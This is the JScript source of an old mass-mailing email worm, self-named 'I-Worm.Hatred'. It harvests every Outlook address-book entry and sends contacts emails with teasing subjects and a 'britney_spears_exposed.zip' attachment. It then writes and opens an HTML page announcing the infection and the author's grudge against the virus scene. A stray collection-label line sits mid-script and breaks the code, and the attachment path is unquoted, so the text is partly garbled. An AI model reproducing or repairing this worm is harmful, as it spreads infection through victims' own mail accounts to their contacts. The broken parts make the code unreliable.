var p,y,x,outlook,fso,mail,mapi,shell,debug;
var subject=new Array("Look at what i found!","funny pic","hah",":]");
try
{
try
{
fso=WScript.CreateObject("Scripting.FileSystemObject");
Outlook=Wscript.CreateObject("Outlook.Application");
mapi=outlook.GetNamespace("MAPI");
p=0;
for(y=1;y<=mapi.AddressLists.Count;y++)
{
for(x=1;x<=mapi.AddressLists(y).AddressEntries.Count;x++)
{
if (p==18)
{
mail.Send
p=0;
}
if (p==0)
{
mail=outlook.CreateItem(0);
mail.Subject=subject[Math.round(Math.random()*3)];
mail.Attachments.Add(britney_spears_exposed.zip);
}                                             

besondereùfalleùfrù-ùSonicRedù-ù22.04.2002

309A054F,41.254 VS053400.JS
             
mail.Recipients.Add(mapi.AddressLists(y).AddressEntries(x));
p++;
}
}
if (p!=0) mail.Send
}
finally
{
WScript.echo("I-Worm.Hatred.beta.A");
debug=fso.CreateTextFile("Hatred.html");
debug.writeline("<HTML>");
debug.writeline("<HEAD>");
debug.writeline("<TITLE> I-Worm.Hatred </TITLE>");
debug.writeline("<BODY>");
debug.writeline("You're infected with Internet Worm Hatred !");
debug.writeline("<P>");
debug.writeline("<B> I-Worm.Hatred Was coded for revenge due to my grief with vxers and avers on IRC and also to announce my retirement from the scene!</B>");
debug.writeline("<P>");
debug.writeline("<I> Don't worry its harmless furball from zenon! :P </I>");
debug.writeline("<P>");
debug.writeline("[I-Worm.Hatred.Beta][Somber/Zerogravity]");
debug.writeline("</P>");
debug.writeline("<HTML>");
debug.Close();
shell=WScript.CreateObject("WScript.Shell");
shell.Run("Hatred.html");
 }
}
catch(i)
{
WScript.echo("Britney_spears_exposed.jpeg Error!");
}
